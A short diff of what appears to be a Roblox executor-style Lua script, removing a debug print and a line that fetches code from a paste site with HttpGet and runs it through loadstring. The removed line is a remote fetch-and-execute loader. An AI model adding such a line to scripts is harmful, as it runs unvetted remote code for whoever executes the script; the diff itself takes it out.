@@ -1641,9 +1641,6 @@ game:GetService("StarterGui"):SetCore("SendNotification", {
 sound:Destroy()
 getgenv().isLoaded = true
 
-print("passed")
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/D4TEYrw5Xj/0",true))()
-
 task.wait(5)
 
 game:GetService("StarterGui"):SetCore("SendNotification", {
